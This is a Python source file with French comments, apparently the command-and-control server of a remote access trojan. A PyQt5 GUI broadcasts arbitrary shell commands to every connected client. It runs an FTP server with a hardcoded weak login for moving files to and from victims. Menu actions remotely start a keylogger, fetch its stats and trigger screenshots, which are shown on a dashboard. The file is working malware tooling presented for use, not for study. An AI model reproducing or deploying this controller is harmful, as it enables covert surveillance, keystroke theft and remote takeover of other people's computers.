import sys
import socket
import threading
import os
import shlex
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPlainTextEdit,
                             QLineEdit, QPushButton, QAction, QFileDialog,
                             QVBoxLayout, QWidget, QHBoxLayout, QInputDialog,
                             QTabWidget, QLabel)
from PyQt5.QtCore import pyqtSignal, QObject, Qt
from PyQt5.QtGui import QPixmap, QImage
# Pour le serveur FTP
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import base64

# Configuration réseau et FTP
HOST = '0.0.0.0'
SOCKET_PORT = 5000
FTP_HOST = '0.0.0.0'
FTP_PORT = 2121

clients = []  # liste des sockets clients

##########################################
# Classe de signalisation pour l'interface
##########################################

class LogEmitter(QObject):
    log_signal = pyqtSignal(str)
    screenshot_signal = pyqtSignal(object)  # On passera un QPixmap

log_emitter = LogEmitter()

##########################################
# Partie serveur socket et FTP
##########################################

def handle_client(conn, addr):
    log_emitter.log_signal.emit(f"[+] Client connecté: {addr}")
    while True:
        try:
            data = conn.recv(16384)
            if not data:
                break
            # Décodage en UTF-8
            message = data.decode('utf-8', errors='replace')
            # Si le message contient une capture d'écran encodée en base64 (ancienne méthode)
            if message.startswith("screenshot_data:"):
                b64_data = message[len("screenshot_data:"):]
                try:
                    img_bytes = base64.b64decode(b64_data)
                    # Création d'une image QImage à partir des octets
                    image = QImage.fromData(img_bytes)
                    pixmap = QPixmap.fromImage(image)
                    log_emitter.screenshot_signal.emit(pixmap)
                    log_emitter.log_signal.emit(f"[Client {addr}] Capture d'écran reçue.")
                except Exception as e:
                    log_emitter.log_signal.emit(f"[-] Erreur lors du décodage de l'image de {addr}: {e}")
            else:
                log_emitter.log_signal.emit(f"[Client {addr}] Réponse:\n{message}\n")
        except Exception as e:
            log_emitter.log_signal.emit(f"[-] Erreur avec {addr}: {e}")
            break
    conn.close()
    log_emitter.log_signal.emit(f"[-] Client déconnecté: {addr}")

def accept_clients(server_socket):
    while True:
        try:
            conn, addr = server_socket.accept()
            clients.append(conn)
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            log_emitter.log_signal.emit(f"[-] Erreur en acceptant un client: {e}")

def start_socket_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.bind((HOST, SOCKET_PORT))
        server_socket.listen(5)
        log_emitter.log_signal.emit(f"[+] Serveur socket en écoute sur {HOST}:{SOCKET_PORT}")
        threading.Thread(target=accept_clients, args=(server_socket,), daemon=True).start()
    except Exception as e:
        log_emitter.log_signal.emit(f"[-] Erreur de démarrage du serveur socket: {e}")

def start_ftp_server():
    try:
        authorizer = DummyAuthorizer()
        # Création d'un utilisateur FTP avec accès complet au répertoire courant
        authorizer.add_user("user", "12345", os.getcwd(), perm="elradfmwMT")
        handler = FTPHandler
        handler.authorizer = authorizer
        ftp_server = FTPServer((FTP_HOST, FTP_PORT), handler)
        log_emitter.log_signal.emit(f"[+] Serveur FTP en écoute sur {FTP_HOST}:{FTP_PORT}")
        threading.Thread(target=ftp_server.serve_forever, daemon=True).start()
    except Exception as e:
        log_emitter.log_signal.emit(f"[-] Erreur de démarrage du serveur FTP: {e}")

##########################################
# Interface graphique avec PyQt5
##########################################

class ServerWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Serveur Shell, FTP, Keylogger & Dashboard")
        self.resize(900, 700)
        self._init_ui()
        log_emitter.log_signal.connect(self.append_log)
        log_emitter.screenshot_signal.connect(self.update_screenshot)
        # Démarrer les serveurs
        start_socket_server()
        start_ftp_server()

    def _init_ui(self):
        # Onglets : Log et Dashboard
        self.tabs = QTabWidget()
        self.log_tab = QWidget()
        self.dashboard_tab = QWidget()

        # Onglet Log
        self.log_area = QPlainTextEdit()
        self.log_area.setReadOnly(True)
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Entrez une commande shell...")
        self.cmd_input.returnPressed.connect(self.send_command)
        send_btn = QPushButton("Envoyer")
        send_btn.clicked.connect(self.send_command)
        h_layout = QHBoxLayout()
        h_layout.addWidget(self.cmd_input)
        h_layout.addWidget(send_btn)
        log_layout = QVBoxLayout()
        log_layout.addWidget(self.log_area)
        log_layout.addLayout(h_layout)
        self.log_tab.setLayout(log_layout)

        # Onglet Dashboard : affiche une image (ancienne méthode si image envoyée via socket)
        self.screenshot_label = QLabel("Aucune capture d'écran")
        self.screenshot_label.setAlignment(Qt.AlignCenter)
        self.screenshot_label.setStyleSheet("border: 1px solid gray;")
        dashboard_layout = QVBoxLayout()
        dashboard_layout.addWidget(self.screenshot_label)
        self.dashboard_tab.setLayout(dashboard_layout)

        self.tabs.addTab(self.log_tab, "Log")
        self.tabs.addTab(self.dashboard_tab, "Dashboard")
        self.setCentralWidget(self.tabs)

        # Menu principal
        menubar = self.menuBar()
        ftp_menu = menubar.addMenu("FTP")
        action_upload = QAction("FTP Upload", self)
        action_upload.triggered.connect(self.ftp_upload)
        ftp_menu.addAction(action_upload)
        action_download = QAction("FTP Download", self)
        action_download.triggered.connect(self.ftp_download)
        ftp_menu.addAction(action_download)

        keylogger_menu = menubar.addMenu("Keylogger")
        action_activate = QAction("Activate Keylogger", self)
        action_activate.triggered.connect(self.activate_keylogger)
        keylogger_menu.addAction(action_activate)
        action_stats = QAction("Keylogger Stats", self)
        action_stats.triggered.connect(self.request_keylogger_stats)
        keylogger_menu.addAction(action_stats)

        screenshot_menu = menubar.addMenu("Capture")
        action_screenshot = QAction("Capture d'écran", self)
        action_screenshot.triggered.connect(self.capture_screenshot)
        screenshot_menu.addAction(action_screenshot)

    def append_log(self, text):
        self.log_area.appendPlainText(text)

    def update_screenshot(self, pixmap):
        self.screenshot_label.setPixmap(pixmap.scaled(self.screenshot_label.size(), Qt.KeepAspectRatio, Qt.SmoothTransformation))

    def send_command(self):
        command = self.cmd_input.text().strip()
        if command:
            self.append_log(f"Commande envoyée: {command}")
            for client in clients:
                try:
                    client.sendall(command.encode('utf-8'))
                except Exception as e:
                    self.append_log(f"[-] Erreur en envoyant la commande: {e}")
            self.cmd_input.clear()

    def ftp_upload(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Sélectionnez un fichier à uploader")
        if file_path:
            remote_name, ok = QInputDialog.getText(self, "Nom distant", "Nom du fichier sur le client:")
            if ok and remote_name:
                cmd = f'ftp_upload "{file_path}" "{remote_name}"'
                self.append_log(f"Commande FTP Upload: {cmd}")
                for client in clients:
                    try:
                        client.sendall(cmd.encode('utf-8'))
                    except Exception as e:
                        self.append_log(f"[-] Erreur en envoyant la commande: {e}")

    def ftp_download(self):
        remote_name, ok = QInputDialog.getText(self, "Fichier distant", "Nom du fichier sur le client:")
        if ok and remote_name:
            save_path, _ = QFileDialog.getSaveFileName(self, "Enregistrer sous", remote_name)
            if save_path:
                cmd = f'ftp_download "{remote_name}" "{save_path}"'
                self.append_log(f"Commande FTP Download: {cmd}")
                for client in clients:
                    try:
                        client.sendall(cmd.encode('utf-8'))
                    except Exception as e:
                        self.append_log(f"[-] Erreur en envoyant la commande: {e}")

    def activate_keylogger(self):
        cmd = "keylogger"
        self.append_log(f"Commande Keylogger Activate: {cmd}")
        for client in clients:
            try:
                client.sendall(cmd.encode('utf-8'))
            except Exception as e:
                self.append_log(f"[-] Erreur en envoyant la commande: {e}")

    def request_keylogger_stats(self):
        cmd = "keylogger_stats"
        self.append_log(f"Commande Keylogger Stats: {cmd}")
        for client in clients:
            try:
                client.sendall(cmd.encode('utf-8'))
            except Exception as e:
                self.append_log(f"[-] Erreur en envoyant la commande: {e}")

    def capture_screenshot(self):
        # Envoie la commande "screenshot" aux clients pour qu'ils effectuent la capture et l'upload FTP
        cmd = "screenshot"
        self.append_log(f"Commande Capture d'écran: {cmd}")
        for client in clients:
            try:
                client.sendall(cmd.encode('utf-8'))
            except Exception as e:
                self.append_log(f"[-] Erreur en envoyant la commande: {e}")

def main():
    app = QApplication(sys.argv)
    window = ServerWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
